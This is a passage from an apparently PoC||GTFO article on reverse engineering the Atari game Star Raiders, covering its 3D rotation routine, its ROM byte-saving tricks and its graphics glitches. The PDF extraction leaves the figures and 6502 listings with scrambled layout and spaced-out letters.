Copy a p o s i t i o n v e c t o r
Copy x and y components ( c o o r d i n a t e s ) o f p o s i t i o n v e c t o r
Handle d o c k i n g a t s t a r b a s e , l a u n c h and r e t u r n o f t r a n s f e r v e s s e l
Modify D i s p l a y L i s t
C l e a r PLAYFIELD memory
C l e a r memory
Handle j o y s t i c k t r i g g e r
Copy n o i s e sound p a t t e r n
C a l c u l a t e homing v e l o c i t y o f our s t a r s h i p ’ s photon t o r p e d o 0 o r 1
Damage o r d e s t r o y one o f our s t a r s h i p ’ s s u b s y s t e m s
D e t e c t a c o l l i s i o n o f our s t a r s h i p ’ s photon t o r p e d o e s
Handle Keyboard I n p u t
S e t Front view
C l e a r PLAYFIELD, draw Attack
Handle game o v e r
Game o v e r ( M i s s i o n s u c c e s s f u l )
S e l e c t hyperwarp a r r i v a l l o c a t i o n on G a l a c t i c Chart
C a l c u l a t e and d i s p l a y hyperwarp e n e r g y
Update t i t l e l i n e
Set t i t l e phrase in t i t l e l i n e
Handle sound e f f e c t s
Copy b e e p e r sound p a t t e r n
More game i n i t i a l i z a t i o n
Draw G a l a c t i c Chart
Handle r e m a i n i n g t a s k s a t t h e end o f a game l o o p i t e r a t i o n
Rotate p o s i t i o n v e c t o r component ( c o o r d i n a t e ) by f i x e d a n g l e
C a l c u l a t e p i x e l column number from c e n t e r e d p i x e l column number
C a l c u l a t e p i x e l row number from c e n t e r e d p i x e l row number
I n i t i a l i z e p o s i t i o n vector of a space object
Randomly i n v e r t t h e x and y components o f a p o s i t i o n v e c t o r
Check i f a s e c t o r i s s u r r o u n d e d by Zylon u n i t s
C o n t r o l Panel D i s p l a y
Decrease energy
D i s p l a y a p o s i t i o n v e c t o r component ( c o o r d i n a t e ) i n
C o n t r o l Panel D i s p l a y
D i s p l a y a v a l u e by a r e a d o u t o f t h e C o n t r o l Panel D i s p l a y
Table 1. Star Raiders Subroutines
8A000
+00
A0C0
A180
A240
A300
A3C0
A480
A540
A600
A6C0
A780
A840
A900
A9C0
AA80
AB40
AC00
ACC0
AD80
AE40
AF00
AFC0
B080
B140
B200
B2C0
B380
B440
B500
+20
+28
+30
+38
+40
+48
OOP
+18
+50
+58
+60
+68
+70
+78
+80
+88
+90
+98
+A0
+A8
+B0
+B8
+C0
##
01
02
03
04
05
06
07
08
09
10
11
12
13
14
15
16
17
18
B680
B740
B800
B8C0
B980
BA40
BB00
BBC0
F
L
U
S
H
G
A
M
E
L
O
O
P
+08
+10
B5C0
19
20
21
22
BITMAP
23
24
25
26
27
28
29
30
BC80
BD40
BE00
BEC0
BF80
W
O
R
D
T
A
B
31
32
33
CODE
34
35
36
37
38
39
40
41
42
43
DATA
Figure 2. Genome Sequence of the STAR RAIDERS ROM
font (in strips 1-2).
a memory map text file to list the used memory lo-
cations and their purpose. These entries were con-
tinually updated – and more than often discarded
after it turned out that I had taken a wrong turn.
• The largest contiguous (dark) blue chunk rep-
resents the 1246 bytes of the main game loop
GAMELOOP ($A1F3) (in strips 3-10).
2.3
• At the beginning of the second data part are
the shapes for the Players (sprites) (in strips
34-36).
A Programming Gem: Rotating
3D Vectors
What is the most interesting, fascinating, and un-
expected piece of code in STAR RAIDERS ? My pick
would be the very code that started me to reverse
engineer STAR RAIDERS in the first place: subrou-
tine ROTATE ($B69B), which rotates objects in the
game’s 3D coordinate space (shown in Figure 3).
And here is why: Rotation calculations usually in-
volve trigonometry, matrices, and so on – at least
some multiplications. But the 6502 CPU has only
8-bit addition and subtraction operations. It does
not provide either a multiplication or a division op-
eration – and certainly no trig operation! So how do
the rotation calculations work, then?
Let’s start with the basics: The game uses a 3D
coordinate system with the position of our starship
at the center of the coordinate system. The loca-
tions of all space objects (Zylon ships, meteors, pho-
• The largest contiguous (light) green chunk rep-
resents the 503 bytes of the game’s word table
WORDTAB ($BC2B) (in strips 38-41).
A good reverse engineering strategy was to start
working from code locations that used Atari’s pub-
lished symbols, the equivalent of piecing together
the border of a jigsaw puzzle first before starting to
tackle the puzzle’s center. Then, however, came the
inevitable and very long stretch of reconstructing
the game’s logic and variables with a combination
of educated guesses, trial-and-error, and lots of pa-
tience. At this stage, the tools I used mostly were
nothing but a text editor (Notepad) and a word pro-
cessor (Microsoft Word) to fill the gaps in the doc-
umentation of the code and the data. I also created
9ton torpedoes, starbase, transfer vessel, Hyperwarp
Target Marker, stars, and explosion fragments) are
described by a position vector relative to our star-
ship.
A position vector is composed of an x, y, and z
component, whose values I call the x, y, and z coor-
dinates with the arbitrary unit <KM>. The range
of a coordinate is −65536 to +65535 <KM>.
Each coordinate is a signed 17-bit integer num-
ber, which fits into three bytes. Bit 16 contains
the sign bit, which is 1 for positive and 0 for nega-
tive sign. Bits 15 to 0 are the mantissa as a two’s-
complement integer.
2.3.1
Rotation Mathematics
The game uses a left-handed 3D coordinate system
with the positive x-axis pointing to the right, the
positive y-axis pointing up, and the positive z-axis
pointing into flight direction.
z-axis
y--axis
z
z-axis
z’
ry
x-axis
x
x’
x-axis
A rotation in this coordinate system around the
y-axis (horizontal rotation) can be expressed as
Sign
Mantissa
B16 B15 . . . B8 B7 . . . . B0
| |
| |
|
4 0000000∗ ∗∗∗∗∗∗∗∗ ∗∗∗∗∗∗∗∗
2
x 0 = cos(r y )x + sin(r y )z
(1)
z 0 = − sin(r y )x + cos(r y )z
where r y is the clockwise rotation angle around the
y-axis, x and z are the coordinates before this ro-
tation, and the primed coordinates x 0 and z 0 the
coordinates after this rotation. The y-coordinate is
not changed by this rotation.
Some example bit patterns for coordinates:
00000001
2 00000001
00000001
4 00000001
00000001
6 00000000
00000000
8 00000000
00000000
10 00000000
11111111
00000001
00000000
00000000
00000000
11111111
11111111
11111111
11111111
00000000
11111111
00000000
11111111
00000001
00000000
11111111
11111110
00000001
00000000
00000000
= +65535 <KM>
=
+256 <KM>
=
+255 <KM>
=
+1 <KM>
=
+0 <KM>
=
−1 <KM>
=
−2 <KM>
=
−255 <KM>
=
−256 <KM>
= −65536 <KM>
y-axis
y
z-axis
x-axis
The position vector for each space object is
stored in nine tables (3 coordinates × 3 bytes for
each coordinate). There are up to 49 space objects
used in the game simultaneously, so each table is 49
bytes long:
XPOSSIGN
($09DE..$0A0E)
YPOSSIGN
($0A0F..$0A3F)
ZPOSSIGN
($09AD..$09DD)
XPOSHI
($0A71..$0AA1)
YPOSHI
($0AA2..$0AD2)
ZPOSHI
($0A40..$0A70)
y-axis
y’
rx
z
z’
z-axis
A rotation in this coordinate system around the
x-axis (vertical rotation) can be expressed as
XPOSLO
($0B04..$0B34)
YPOSLO
($0B35..$0B65)
ZPOSLO
($0AD3..$0B03)
With that explained, let’s have a look at sub-
routine ROTATE ($B69B). This subroutine rotates a
position vector component (coordinate) of a space
object by a fixed angle around the center of the
3D coordinate system, the location of our starship.
This operation is used in 3 out of 4 of the game’s
view modes (Front view, Aft view, Long-Range Scan
view) to rotate space objects in and out of the view.
z 0 = cos(r x )z + sin(r x )y
(2)
y 0 = − sin(r x )z + cos(r x )y
where r x is the clockwise rotation angle around the
x-axis, z and y are the coordinates before this ro-
tation, and the primed coordinates z 0 and y 0 the
coordinates after this rotation. The x-coordinate is
not changed by this rotation.
2.3.2
Subroutine Implementation Overview
A single call of subroutine ROTATE ($B69B) is able
to compute one of the four expressions in Equa-
tions 1 and 2. To compute all four expressions to
10get the new set of coordinates, this subroutine has
to be called four times. This is done twice in pairs
in GAMELOOP ($A1F3) at $A391 and $A398, and at
$A3AE and $A3B5, respectively.
The first pair of calls calculates the new x and
z coordinates of a space object due to a horizon-
tal (left/right) rotation of our starship around the
y-axis following the expressions of Equation 1.
The second pair of calls calculates the new y and
z coordinates of the same space object due to a ver-
tical (up/down) rotation of our starship around the
x-axis following the expressions of Equation 2.
If you look at the code of ROTATE ($B69B), you
may be wondering how this calculation is actually
executed, as there is neither a sine nor cosine func-
tion call. What you’ll actually find implemented,
however, are the following calculations:
From sin(r y ) = 1/64 and sin(r x ) = 1/64 you can
derive that the rotation angles r y and r x by which
the space object is rotated (per game loop iteration)
have a constant value of 0.89 ◦ , as arcsin(1/64) =
0.89 ◦ .
What about cos(r y ) and cos(r x )? The substi-
tution does not match our derived angle exactly,
because cos(0.89 ◦ ) = 0.99988 and is not exactly
1. However, this value is so close that substitut-
ing cos(0.89 ◦ ) with 1 is a very good approximation,
simplifying calculations significantly.
Another significant simplification results from
the division by 64, as the actual division operation
can be replaced with a much faster bit shift opera-
tion.
This calculation-friendly way of computing rota-
tions is also known as the “CORDIC (COordinate
Rotation DIgital Computer)” algorithm.
Joystick Left
x := x + z/64
2.3.4
(3)
There is one more interesting mathematical sub-
tlety: Did you notice that expressions of Equa-
tions 1 and 2 use a new (primed) pair of variables
to store the resulting coordinates, whereas in the
implemented Equations 3–6, the value of the first
coordinate of a coordinate pair is overwritten with
its new value and this value is used in the subsequent
calculation of the second coordinate? For example,
when the joystick is pushed left, the first call of this
subroutine calculates the new value of x according
to first expression of Equation 3, overwriting the old
value of x. During the second call to calculate z ac-
cording to the second expression of Equation 3, the
new value of x is used instead of the old one. Is this
to save the memory needed to temporarily store the
old value of x? Is this a bug? If so, why does the
rotation calculation actually work?
Have a look at the expressions of Equation 3 (the
other Equations 4–6 work in a similar fashion):
z := −x/64 + z
Joystick Right
x := x − z/64
(4)
z := x/64 + z
Joystick Down
y := y + z/64
(5)
z := −y/64 + z
Joystick Up
y := y − z/64
(6)
z := y/64 + z
2.3.3
Minsky Rotation
CORDIC Algorithm
When you compare the expressions of Equations 1–2
with expressions of Equations 3–6, notice the simi-
larity between the expressions if you substitute 5
x := x + z/64
z := −x/64 + z
If we substitute 1/64 with e, we get
sin(r y ) → 1/64
cos(r y ) → 1
sin(r x ) → 1/64 x := x + ez
cos(r x ) → 1 z := −ex + z
5 This substitution gave a friendly mathematician who happened to see it a nasty shock. She yelled at us that cos 2 x+sin 2 x = 1
for all real x and forever, and therefore this could not possibly be a rotation; it’s a rotation with a stretch! We reminded her
of the old joke that in wartime the value of the cosine has been known to reach 4. —PML
11Note that x is calculated first and then used in
the second expression. When using primed coordi-
nates for the resulting coordinates after calculating
the two expressions we get
the two new coordinates after a rotation, the SIGN
toggles from plus to minus and vice versa. The SIGN
is initialized with the value of JOYSTICKDELTA ($6D)
before calling subroutine ROTATE ($B69B, Figure 3)
and is toggled in every call of this subroutine. The
initial value of SIGN should be positive (+, byte
value $01) if the rotation is clockwise (the joystick is
pushed right or up) and negative (−, byte value $FF)
if the rotation is counter-clockwise (the joystick is
pushed left or down), respectively. Because SIGN is
always toggled in ROTATE ($B69B) before the adding
or subtraction operation of TERM1 and TERM3 takes
place, you have to pass the already toggled value
with the first call.
Unclear still are three instructions starting at ad-
dress $B6AD. They seem to set the two least signifi-
cant bits of TERM3 in a random fashion. Could this
be some quick hack to avoid messing with exact but
potentially lengthy two’s-complement arithmetic?
x 0 := x + ez
z 0 := − ex 0 + z
= − e(x + ez) + z
= − ex + (1 − e 2 )z
or in matrix form
 0  
x
1
=
z 0
−e
e
1 − e 2

x
z

Surprisingly, this turns out to be a rotation ma-
trix, because its determinant is (1 × (1 − e 2 ) − (−e ×
e)) = 1. (Incidentally, the column vectors of this
matrix do not form an orthogonal basis, as their
scalar product is 1 × e + (−e × (1 − e 2 )) = −e 2 .
Orthogonality holds for e = 0 only.)
This kind of rotation calculation is described
by Marvin Minsky in AIM 239 HAKMEM 6 and is
called “Minsky Rotation.”
2.3.5
CX40
Subroutine Implementation Details
To better understand how the implementation of
this subroutine works, we must again look at Equa-
tions 3–6. If you rearrange the expressions a little,
their structure is always of the form:
TERM1 := TERM1 SIGN TERM2/64
or shorter
TERM1 := TERM1 SIGN TERM3
where TERM3 := TERM2/64 and SIGN := + or − and
where TERM1 and TERM2 are coordinates. In fact, this
is all this subroutine actually does: It simply adds
TERM2 divided by 64 to TERM1 or subtracts TERM2
divided by 64 from TERM1.
When calling this subroutine the correct table
indices for the appropriate coordinates TERM1 and
TERM2 are passed in the CPU’s Y and X registers,
respectively.
What about SIGN between TERM1 and TERM3?
Again, have a look at Equations 3–6. To compute
6 unzip
2.4
Dodging Memory Limitations
It is impressing how much functionality was
squeezed into STAR RAIDERS . Not surprisingly, the
bytes of the 8 KB ROM are used up almost com-
pletely. Only a single byte is left unused at the very
end of the code. When counting four more bytes
from three orphaned entries in the game’s lookup
tables, only five bytes in total out of 8,192 bytes are
actually not used. ROM memory was extremely pre-
cious. Here are some techniques that demonstrate
pocorgtfo13.pdf AIM-239.pdf #Item 149, page 73.
12;
;
;
;
;
;
;
;
;
;
;
;
;
;
;
2
4
6
8
10
12
14
INPUT
X = P o s i t i o n v e c t o r component i n d e x o f TERM2 . Used
$ 0 0 . . $ 3 0 −> z−component ( z−c o o r d i n a t e ) o f p o s i t i o n
$ 3 1 . . $ 6 1 −> x−component ( x−c o o r d i n a t e ) o f p o s i t i o n
$ 6 2 . . $ 9 2 −> y−component ( y−c o o r d i n a t e ) o f p o s i t i o n values
vector
vector
vector are :
0..48
0..48
0..48
Y = P o s i t i o n v e c t o r component i n d e x o f TERM1 . Used
$ 0 0 . . $ 3 0 −> z−component ( z−c o o r d i n a t e ) o f p o s i t i o n
$ 3 1 . . $ 6 1 −> x−component ( x−c o o r d i n a t e ) o f p o s i t i o n
$ 6 2 . . $ 9 2 −> y−component ( y−c o o r d i n a t e ) o f p o s i t i o n values
vector
vector
vector are :
0..48
0..48
0..48
JOYSTICKDELTA ( $6D ) = I n i t i a l v a l u e o f SIGN .
$ 0 1 −> (= P o s i t i v e ) R o t a t e r i g h t o r up
$FF −> (= N e g a t i v e ) R o t a t e l e f t o r down
Used
values
are :
16
;
;
;
;
;
18
=006A
=006B
=006C
20
L . TERM3LO
= $6A
L . TERM3HI
= $6B
L . TERM3SIGN = $6C
TERM3
$( sign
TERM3
TERM3
TERM3
i s a 24− b i t v a l u e , r e p r e s e n t e d by
) ( h i g h byte ) ( low byte )
( h i g h b y t e ) , w h e r e TERM3 := TERM2
( low byte ) ,
w h e r e TERM3 := TERM2
( sign ) ,
w h e r e TERM3 := TERM2
3
bytes
as
/ 64
/ 64
/ 64
22
B69B
B69E
B6A0
26 B6A2 BDAD09
4901
F002
A9FF ROTATE
28 B6A4
B6A6
30 B6A8
B6AB
32
B6AD
34 B6B0
B6B2
36
B6B5
38 B6B6
B6B8
40 B6BA
B6BB
42 B6BD 8 5 6B
8 5 6C
BD400A
8 5 6A SKIP224
24
44 B6BF
B6C1
46 B6C3
B6C5
48
B6C7
B6C8
52 B6CB
B6CD
54
B6D0
56 B6D3
B6D5
58
B6D8
60 B6DB
B6DD
62 B6E0
68
B6E1
B6E2
B6E5
B6E7
;
;
;
; STA
STA
LDA
STA L . TERM3HI
L . TERM3SIGN
ZPOSHI , X
L . TERM3LO ;
;
;
; I f TERM2 p o s . −> TERM3 := $ 0 0 0 0 x x (= TERM2 /
I f TERM2 n e g . −> TERM3 := $FFFFxx (= TERM2 /
w h e r e xx := TERM2 ( h i g h b y t e )
(?)
(?)
(?)
sign
o f TERM2 i s
positive
256)
256)
0A
2 6 6A
2 6 6B
0A
2 6 6A
2 6 6B ASL
ROL
ROL
ASL
ROL
ROL A
L . TERM3LO
L . TERM3HI
A
L . TERM3LO
L . TERM3HI ; TERM3 := TERM3 ∗ 4 (= TERM2 / 2 5 6 ∗ 4 = TERM2 /
;
;
;
;
;
A56D
49FF
8 5 6D
3 0 1A LDA
EOR
STA
BMI JOYSTICKDELTA
#$FF
JOYSTICKDELTA
SKIP225 ;
;
;
;
18
B9D30A
6 5 6A
99D30A
B9400A
6 5 6B
9 9 4 0 0A LDA ZPOSHI , Y
ADC L . TERM3HI
STA ZPOSHI , Y ;
;
;
B9AD09
6 5 6C
99AD09
60 LDA ZPOSSIGN , Y
ADC L . TERM3SIGN
STA ZPOSSIGN , Y
RTS ;
;
;
;
38
B9D30A
E56A
99D30A
T o g g l e SIGN
If
for
SIGN n e g a t i v e
next
then
call
o f ROTATE
subtract ,
else
add TERM3
; ∗ ∗ ∗ S u b t r a c t i o n ∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗
SKIP225
SEC
; TERM1 := TERM1 − TERM3
LDA ZPOSLO, Y
; (24− b i t s u b t r a c t i o n )
SBC L . TERM3LO
;
STA ZPOSLO, Y
;
;
;
;
74 LDA ZPOSSIGN , Y
SBC L . TERM3SIGN
STA ZPOSSIGN , Y
RTS ;
;
;
;
B9AD09
E56C
99AD09
60
Hack t o a v o i d m e s s i n g w i t h two−complement ’ s
a r i t h m e t i c ? P r o v i d e s two l e a s t s i g n i f i c a n t
b i t s B1 . . 0 i n TERM3 .
A d d i t i o n ∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗
CLC
; TERM1 := TERM1 + TERM3
LDA ZPOSLO, Y
; (24− b i t a d d i t i o n )
ADC L . TERM3LO
;
STA ZPOSLO, Y
;
LDA ZPOSHI , Y
SBC L . TERM3HI
STA ZPOSHI , Y
B6F2
B6F5
B6F7
B6FA
if
;
;
;
70 B6EA B9400A
B6ED E56B
72 B6EF 9 9 4 0 0A
76
Skip
LDA RANDOM
ORA #$BF
EOR ZPOSLO, X
64
66
ZPOSSIGN , X
#$ 0 1
SKIP224
#$FF AD0AD2
09BF
5DD30A
; ∗∗∗
50
LDA
EOR
BEQ
LDA
Figure 3. ROTATE Subroutine at $B69B
13
64)the fierce fight for each spare ROM byte.
2.4.1
This saves another six bytes (PLA, TAY, PLA, TAX,
PLA, RTI), but spends three bytes (JMP JUMP004), in
total saving three bytes.
Loop Jamming
Loop jamming is the technique of combining two
loops into one, reusing the loop index and option-
ally skipping operations of one loop when the loop
index overshoots.
How much bytes are saved by loop jamming? As
an example, Figure 4 shows an original 19-byte frag-
ment of subroutine INITIALIZE ($B3BA) using loop
jamming. The same fragment without loop jam-
ming, shown in Figure 5, is 20 bytes long. So loop
jamming saved one single byte.
Another example is the loop that is set up at
$A165 in INITCOLD ($A14A). A third example is the
loop set up at $B413 in INITIALIZE ($B3BA). This
loop does not explicitly skip loop indices, thus sav-
ing four more bytes (the CMP and BCS instructions)
on top of the one byte saved by regular loop jam-
ming. Thus, seven bytes are saved in total by loop
jamming.
2.4.2
2.5
There are a few bugs, or let’s call them glitches, in
STAR RAIDERS . This is quite astonishing, given the
complex game and the development tools of 1979,
and is a testament to thorough play testing. The
interesting thing is that the often intense game play
distracts the players’ attention from noticing these
glitches, just like what a skilled parlor magician
would do.
2.5.1
A Starbase Without Wings
When a starbase reaches the lower edge of the graph-
ics screen and overlaps with the Control Panel Dis-
play below (Figure 8 (left), screenshot) and you
nudge the starbase a little bit more downward, its
wings suddenly vanish (Figure 8 (right), screenshot).
The reason is shown in the insert on the right
side of the figure: The starbase is a composite of
three Players (sprites). Their bounding boxes are
indicated by three white rectangles. If the verti-
cal position of the top border of a Player is larger
than a vertical position limit, indicated by the tip
of the white arrow, the Player is not displayed. The
relevant location of the comparison is at $A534 in
GAMELOOP ($A1F3). While the Player of the central
part of the starbase does not exceed this vertical
limit, the Players that form the starbase’s wings do
so, and are thus not rendered.
This glitch is rarely noticed because players do
their best to keep the starbase centered on the
screen, a prerequisite for a successful docking.
Sharing Blank Characters
One more technique to save bytes is to let strings
share their leading and trailing blank characters. In
the game there is a header text line of twenty char-
acters that displays one of the strings “LONG RANGE
SCAN,” “AFT VIEW,” or “GALACTIC CHART.” The dis-
play hardware directly points to their location in the
ROM. They are enclosed in blank characters (bytes
of value $00) so that they appear horizontally cen-
tered.
A naive implementation would use 3 × 20 = 60
bytes to store these strings in ROM. In the actual
implementation, however, the trailing blanks of one
header string are reused as leading blanks of the
following header, as shown in Figure 6. By shar-
ing blank characters the required memory is reduced
from 60 bytes to 54 bytes, saving six bytes.
2.4.3
Bugs
2.5.2
Shuffling Priorities
There are two glitches that are almost impossible to
notice (and I admit some twisted kind of pleasure to
expose them, ;-):
Reusing Interrupt Exit Code
• During regular gameplay, the Zylon ships and
the photon torpedoes appear in front of the
cross hairs (Figure 9 (left)), as if the cross hairs
were light years away.
Yet another, rather traditional technique is to reuse
code, of course. Figure 7 shows the exit code of the
Vertical Blank Interrupt handler VBIHNDLR ($A6D1)
at $A715, which jumps into the exit code of the Dis-
play List Interrupt handler DLSTHNDLR ($A718) at
$A74B, reusing the code that restores the registers
that were put on the CPU stack before entering the
Vertical Blank Interrupt handler.
• During docking, the starbase not only appears
behind the stars (Figure 9 (right)) as if the
starbase is light years away, but the transfer
vessel moves in front of the cross hairs!
141 B3BA
B3BC
3 B3BE
B3C1
5 B3C3
B3C5
7 B3C8
B3CA
9 B3CB
A259
A90D
9 D8502
E00A
B005
BDA9BF
95 F2
CA
10EF
INITIALIZE
LOOP060
SKIP195
LDX
LDA
STA
CPX
BCS
LDA
STA
DEX
BPL
#89
#$0D
DSPLST+5 ,X
#10
SKIP195
PFCOLORTAB, X
PF0COLOR, X
LOOP060
; S e t 8 9 ( + 1 ) GRAPHICS7 r o w s f r o m DSPLST+5 on
; Prep DL i n s t r u c t i o n $0D ( o n e row o f GRAPHICS7)
; DSPLST+5 ,X := o n e row o f GRAPHICS7
;
;
; Copy PLAYFIELD c o l o r t a b l e t o z e r o −p a g e t a b l e
; ( l o o p jamming )
;
;
Figure 4. INITIALIZE Subroutine at $B3BA (Excerpt)
1 B3BA
B3BC
3 B3BE
B3C1
5 B3C2
B3C4
7 B3C6
B3C9
9 B3CB
B3CC
A259
A90D
9 D8502
CA
10 F8
A209
BDAABF
95 F2
CA
10 F8
INITIALIZE
LOOP060
LOOP060B
LDX
LDA
STA
DEX
BPL
LDX
LDA
STA
DEX
BPL
#89
#$0D
DSPLST+5 ,X
LOOP060
#9
PFCOLORTAB, X
PF0COLOR, X
LOOP060B
; S e t 8 9 ( + 1 ) GRAPHICS7 r o w s f r o m DSPLST+5 on
; Prep DL i n s t r u c t i o n $0D ( o n e row o f GRAPHICS7)
; DSPLST+5 ,X := o n e row o f GRAPHICS7
;
;
;
; Copy PLAYFIELD c o l o r t a b l e t o z e r o −p a g e t a b l e
;
;
;
Figure 5. INITIALIZE Subroutine Without Loop Jamming (Excerpt)
This time the arrangement is fine for the cross
hairs as they are bit-mapped graphics and need to
appear in front of the starbase, but this arrangement
also applies to the stars. In addition, the Player of
the white transfer vessel correctly appears in front
of the bit-mapped stars, but also in front of the bit-
mapped cross hairs.
Fixing these glitches is hardly possible, as the
display hardware does not allow for a finer control
of graphics priorities for individual Players.
The reason is the drawing order or “graphics pri-
ority” of the bit-mapped graphics and the Players
(sprites). It is controlled by the PRIOR ($D01B) hard-
ware register.
During regular flight, see Figure 9 (left), PRIOR
($D01B) has a value of $11. This arranges the dis-
played elements in the following order, from front to
back:
• Players 0-4 (photon torpedoes, Zylon ships,
...)
• Bit-mapped graphics (stars, cross hairs) 2.6
• Background. A simple instruction at location $A175 contained
the most mysterious finding in the game’s code.
The disassembler reported the following instruction,
which is equivalent to STA $0067,X. (ISVBISYNC has
a value of $67.)
This arrangement is fine for the stars as they are
bit-mapped graphics and need to appear behind the
photon torpedoes and the Zylon ships, but this ar-
rangement applies also to the cross hairs – causing
the glitch.
During docking, see Figure 9 (right), PRIOR
($D01B) has a value of $14. This arranges the dis-
played elements the following order, from front to
back:
A Mysterious Finding
A175 9D6700
STA ISVBISYNC ,X
The object code assembled from this instruction
is unusual as its address operand was assembled
as a 16-bit address and not as an 8-bit zero-page
address. Standard 6502 assemblers would always
generate shorter object code, producing 9567 (STA
$67,X) instead of 9D6700 and saving a byte.
In my reverse engineered source code, the only
way to reproduce the original object code was the
following:
• Player 4 (transfer vessel)
• Bit-mapped graphics (stars, cross hairs)
• Players 0-3 (starbase, . . . )
• Background.
152
A0F8
A0FC
4 A100
A104
6 A108
8
A109
10 A10D
A111
12 A115
A119
14
16 A11A
A11E
18 A122
A126
20 A12A
; ∗∗∗ Header
0 0 0 0 6 C6F LRSHEADER
6 E670072
6 1 6 E6765
00736361
6E text
; ∗∗∗ Header
0 0 0 0 0 0 0 0 AFTHEADER
00006166
74007669
65770000
00 text
; ∗∗∗ Header
0 0 0 0 0 0 6 7 GCHEADER
6 1 6 C6163
74696300
63686172
74000000 text
o f Long−Range Scan v i e w ( s h a r e s s p a c e s
. BYTE $00 , $00 , $6C , $6F , $6E , $67 , $00 , $ 7 2 ;
with f o l l o w i n g header ) ∗
‘‘
LONG RANGE SCAN ’ ’
. BYTE $61 , $6E , $67 , $65 , $00 , $73 , $63 , $ 6 1
. BYTE $6E
h e a d e r ) ∗∗∗∗∗∗∗∗∗∗∗∗∗
AFT VIEW
‘‘
o f Aft view ( s h a r e s s p a c e s with f o l l o w i n g
. BYTE $00 , $00 , $00 , $00 , $00 , $00 , $61 , $ 6 6 ; ‘ ‘
. BYTE $74 , $00 , $76 , $69 , $65 , $77 , $00 , $ 0 0
. BYTE $ 0 0
o f G a l a c t i c C h a r t v i e w ∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗
. BYTE $00 , $00 , $00 , $67 , $61 , $6C , $61 , $ 6 3 ; ‘ ‘
GALACTIC CHART
‘‘
. BYTE $74 , $69 , $63 , $00 , $63 , $68 , $61 , $ 7 2
. BYTE $74 , $00 , $00 , $ 0 0
Figure 6. Header Texts at $A0F8
A6D1 A9FF
2
A715 4C4BA7
4
A718 48
6
A74B
8 A74C
A74D
10 A74E
A74F
12 A750
68
A8
68
AA
68
40
VBIHNDLR
...
SKIP046
...
DLSTHNDLR
...
JUMP004
LDA #$FF ; Start
JMP JUMP004 ; End
of
of
PHA ; Start
PLA
TAY
PLA
TAX
PLA
RTI ;
;
;
;
;
; Restore
End
of
Vertical
Vertical
of
Blank
Interrupt
handler
Blank Interrupt handler
List Interrupt handler
Display
registers
Display
List
Interrupt
Handler
Figure 7. VBIHNDLR and DLSTHNDLR Handlers Share Exit Code
it made click: The instruction STA ISVBISYNC,X is
used in a loop which iterates the CPU’s X register
from 0 to 255 to clear memory. By using this instruc-
tion with a 16-bit address (“indexed” mode operand)
memory from $0067 to $0166 is cleared. Had the
code been using the same operation with an 8-bit ad-
dress (“indexed, zero-page” mode operand), memory
from $0067 to $00FF would have been cleared, then
the indexed address would have wrapped back to
$0000 clearing memory $0000 to $0066, effectively
overwriting already initialized memory locations.
1 ; HACK: Fake STA ISVBISYNC ,X with 16b addr
A175 9D
.BYTE $9D
3 A176 6700
.WORD ISVBISYNC
I speculated for a long time whether this strange
assembler output indicated that the object code of
the original ROM cartridge was produced with a
non-standard 6502 assembler. I have heard that
Atari’s in-house development systems ran on PDP-
11 hardware. Luckily, the month after I finished
my reverse engineering effort, the original STAR
RAIDERS source code re-surfaced. 7 To my aston-
ishment it uses exactly the same “hack” to repro-
duce the three-byte form of the STA ISVBISYNC,X
instruction:
1
A175 9D
A176 67 00
2.7
Documenting Star Raiders
Right from the start of reverse engineering STAR
RAIDERS I not only wanted to understand how the
game worked, but I also wanted to document the re-
sult of my effort. But what would be an appropriate
form?
First, I combined the emerging memory map file
with the fledgling assembly language source code in
. BYTE $9D
; STA ABS , X
.WORD PAGE0 ; STA PAGE0, X (ABSOLUTE)
Unfortunately the comments do not give a clue
why this pattern was chosen. After quite some time
7 https://archive.org/details/AtariStarRaidersSourceCode
unzip pocorgtfo13.pdf StarRaidersOrig.pdf
16Figure 8. A Starbase’s Wings Vanish
Figure 9. Photon torpedo in front of cross hairs and a starbase behind the stars!
order to work with just one file. Then, I switched
the source code format to that of MAC/65, a well-
known and powerful macro assembler for the Atari
8-bit Home Computer System. I also planned, at
some then distant point in the future, to assemble
the finished source code with this assembler on an
8-bit Atari.
Another major influence on the emerging docu-
mentation was the Atari BASIC Source Book, which
I came across by accident 8 . It reproduced the com-
plete, commented assembly language source code of
the 8 KB Atari BASIC interpreter cartridge, a truly
non-trivial piece of software. But what was more:
The source code was accompanied by several chap-
ters of text that explained in increasing detail its
concepts and architecture, that is, how Atari BASIC
actually worked. Deeply impressed, I decided on
the spot that my reverse engineered STAR RAIDERS
source code should be documented at the same level
of detail.
The overall documentation structure for the
source code, which I ended up with was fourfold: On
the lowest level, end-of-line comments documented
the functionality of individual instructions. On the
next level, line comments explained groups of in-
structions. One level higher still, comments com-
8 The
posed of several paragraphs introduced each sub-
routine. These paragraphs provided a summary of
the subroutine’s implementation and a description
of all input and output parameters, including the
valid value ranges, if possible. On the highest level,
I added the memory map to the source code as a
handy reference. I also planned to add some chap-
ters on the game’s general concepts and overall ar-
chitecture, just like the Atari BASIC Source Book
had done. Unfortunately, I had to drop that idea
due to lack of time. I also felt that the detailed sub-
routine documentation was quite sufficient. How-
ever, I did add sections on the 3D coordinate system
and the position and velocity vectors to the source
code as a tip of the hat to the Atari BASIC Source
Book.
After I was well into reverse engineering STAR
RAIDERS , slowly adding bits and pieces of informa-
tion to the raw disassembly of the STAR RAIDERS
ROM and fleshing out the ever growing documen-
tation, I started to struggle with establishing a con-
sistent and uniform terminology for the documenta-
tion (Is it “asteroid,” “meteorite,” or “meteor”? “Ex-
plosion bits,” “explosion debris,” or “explosion frag-
ments”? “Gun sights” or “cross hairs”?) A look into
the STAR RAIDERS instruction manual clarified only
Atari BASIC Source Book by Wilkinson, O’Brien, and Laughton. A COMPUTE! publication.
17a painfully small amount of cases. Incidentally, it
also contradicted itself as it called the enemies “Cy-
lons” while the game called them “Zylons,” such as
